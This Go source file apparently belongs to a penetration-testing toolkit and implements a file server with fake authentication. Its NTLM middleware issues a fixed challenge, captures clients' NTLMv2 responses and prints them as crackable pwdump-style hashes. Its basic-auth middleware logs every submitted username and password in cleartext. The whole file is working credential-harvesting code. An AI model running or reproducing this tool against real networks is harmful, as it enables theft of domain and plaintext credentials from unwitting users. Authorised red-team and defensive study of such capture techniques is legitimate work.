package gopserve

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/hophouse/gop/ntlm"
	"github.com/hophouse/gop/utils"
	"github.com/urfave/negroni"
)

var ntlmCapturedAuth map[string]bool

func RunServeCmd(host string, port string, directory string, auth string, realm string) {
	begin := time.Now()
	path, err := os.Getwd()
	if err != nil {
		utils.Log.Println(err)
	}

	if !strings.HasPrefix(directory, "/") && !strings.HasPrefix(directory, "C:\\") {
		directory = filepath.Join(path, directory)
	}

	addr := fmt.Sprintf("%s:%s", host, port)
	fmt.Printf("[+] Serve file to: http://%s for %s\n", addr, directory)

	// Router
	r := mux.NewRouter()

	fileServer := http.FileServer(http.Dir(directory))
	r.PathPrefix("/").Handler(fileServer)
	n := negroni.New(negroni.NewRecovery())
	n.Use(&logMiddleware{})

	// Apply an auth system if requested
	switch strings.ToLower(auth) {
	case "basic":
		n.Use(&basicAuthMiddleware{
			realm: realm,
		})
	case "ntlm":
		ntlmCapturedAuth = make(map[string]bool)
		n.Use(&NTLMAuthMiddleware{})
	}

	n.UseHandler(r)
	utils.Log.Fatal(http.ListenAndServe(addr, n))

	end := time.Now()
	fmt.Printf("\n -  Execution time: %s\n", end.Sub(begin))
}

type logMiddleware struct{}

func getSourceIP(r *http.Request) string {
	if ipSrc := r.Header.Get("X-Real-Ip"); ipSrc != "" {
		return ipSrc
	}
	return r.RemoteAddr
}

func (l logMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	fmt.Printf("[%s] [%s] %s %s\n", time.Now().Format("2006.01.02 15:04:05"), getSourceIP(r), r.Method, r.URL)
	utils.Log.Printf("\n[%s] [%s]\n", time.Now().Format("2006.01.02 15:04:05"), getSourceIP(r))

	utils.Log.Printf("%s %s %s", r.Method, r.URL, r.Proto)
	for k, v := range r.Header {
		for _, vv := range v {
			utils.Log.Printf("%s: %s ", k, vv)
		}
		//utils.Log.Printf("\n")
	}
	next(w, r)
}

type NTLMAuthMiddleware struct{}

func (n NTLMAuthMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	// Get the response header.
	authorization := r.Header.Get("Authorization")

	if authorization == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	// Remove the "NTLM " string at the beginning
	authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
	if err != nil {
		fmt.Println("decode error:", err)
		return
	}

	if len(authorization_bytes) < 40 {
		return
	}

	msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

	// Received a type 1 and respond with type 2
	if msgType == uint32(1) {
		msg1 := ntlm.NTLMSSP_NEGOTIATE{}
		msg1.Read(authorization_bytes)
		utils.Log.Printf("[NTLM message type 1]\n", msg1.ToString())

		msg2 := ntlm.NewNTLMSSP_CHALLENGEShort()
		msg2b64 := base64.RawStdEncoding.EncodeToString(msg2.ToBytes())

		header := fmt.Sprintf("NTLM %s", msg2b64)

		w.Header().Set("WWW-Authenticate", header)
		w.WriteHeader(401)

		return
	}

	// Type 3
	if msgType == uint32(3) {
		// Remove the "NTLM "
		_, err := base64.StdEncoding.DecodeString(authorization[5:])
		if err != nil {
			fmt.Println("decode error:", err)
			return
		}

		msg3 := ntlm.NTLMSSP_AUTH{}
		msg3.Read(authorization_bytes)
		utils.Log.Printf("[NTLM-AUTH] [%s] [%s] [%s] ", msg3.TargetName.RawData, msg3.Username.RawData, msg3.Workstation.RawData)
		utils.Log.Printf("[NTLM message type 3]\n%s", msg3.ToString())

		ntlmv2Response := ntlm.NTLMv2Response{}
		ntlmv2Response.Read(msg3.NTLMv2Response.RawData)
		utils.Log.Printf("%s", ntlmv2Response.ToString())

		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(ntlm.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])

		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.RawData), string(msg3.Username.RawData))
		if _, found := ntlmCapturedAuth[authInformations]; found != true {
			ntlmCapturedAuth[authInformations] = true
			fmt.Printf("[PWDUMP] %s", ntlmv2_pwdump)
			utils.Log.Printf("[PWDUMP] %s", ntlmv2_pwdump)
		} else {
			utils.Log.Printf("[+] User %s NTLMv2 challenge already captured.\n", authInformations)
			fmt.Printf("[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
		}
	}

	next(w, r)
}

type basicAuthMiddleware struct{
	realm string
}

func (n basicAuthMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	authorization := r.Header.Get("Authorization")

	if authorization == "" {
		basicHeader := "Basic" 
		if n.realm != "" {
			basicHeader = fmt.Sprintf("Basic realm=\"%s\"", n.realm) 
		}
		w.Header().Set("WWW-Authenticate", basicHeader)
		w.WriteHeader(401)
		return
	}

	if username, password, ok := r.BasicAuth(); ok == true {
		fmt.Printf("[AUTH-BASIC] [%s] [%s]\n", username, password)
		utils.Log.Printf("[AUTH-BASIC] [%s] [%s]\n", username, password)
	}

	next(w, r)
}
